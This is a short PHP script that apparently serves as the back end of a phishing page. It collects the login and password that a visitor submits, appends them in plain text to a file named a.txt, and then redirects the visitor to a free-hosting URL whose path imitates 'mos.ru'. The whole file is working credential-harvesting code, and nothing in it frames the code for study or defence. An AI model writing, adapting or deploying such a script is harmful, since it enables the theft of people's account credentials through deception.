<?PHP
$Log = $_POST['login'];
$Pass = $_POST['pass'];
$log = fopen("a.txt","at");
fwrite($log,"$Log:$Pass\n");
fclose($log);
echo "<html><head><META HTTP-EQUIV='Refresh' content ='0; URL=https://terribleornot.000webhostapp.com/mos.ru/'></head></html>";
?>